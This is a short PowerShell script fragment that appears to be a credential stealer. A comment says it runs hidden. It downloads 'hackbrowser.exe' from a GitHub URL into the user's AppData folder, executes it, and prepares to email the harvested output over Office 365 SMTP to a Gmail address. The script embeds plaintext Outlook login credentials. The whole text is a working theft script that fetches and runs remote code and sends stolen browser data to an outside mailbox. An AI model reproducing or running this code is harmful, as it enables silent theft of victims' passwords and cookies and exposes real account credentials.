#this code is to do powershell hidden
...
Invoke-WebRequest -Uri "https://github.com/Zenixzz/ShibaShoup/raw/main/hackbrowser.exe" -OutFile "$env:appdata\dump\hb.exe"
./hb.exe
...
$Random = Get-Random
#Mailing the output you will need to enable the smpt on outlook account for this to work
$Message = new-object Net.Mail.MailMessage
$smtp = new-object Net.Mail.SmtpClient("smtp.office365.com", 587)
$smtp.Credentials = New-Object System.Net.NetworkCredential("yurishiba@outlook.com", "shibayuri123");
$smtp.EnableSsl = $true
$Message.From = "yurishiba@outlook.com"
$Message.To.Add("yurisiqueirabuss14@gmail.com")
